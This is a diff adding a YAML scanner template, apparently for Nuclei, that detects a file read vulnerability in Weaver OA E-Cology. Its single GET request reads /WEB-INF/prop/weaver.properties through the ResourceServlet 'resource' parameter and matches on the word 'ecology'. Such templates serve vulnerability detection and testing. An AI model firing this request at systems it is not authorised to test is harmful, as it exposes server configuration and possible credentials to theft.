@@ -1,0 +1,36 @@
+id: weaver-oa-e-cology-resourceservlet-file-read
+
+info:
+  name: Weaver OA E-Cology ResourceServlet File Read Vulnerability
+  author: onewin
+  severity: high
+  description: Checks for a file read vulnerability in Weaver OA E-Cology's ResourceServlet.
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ecology"
+        part: body
+
+      - type: dsl
+        dsl:
+          - "contains(body, 'ecology')"
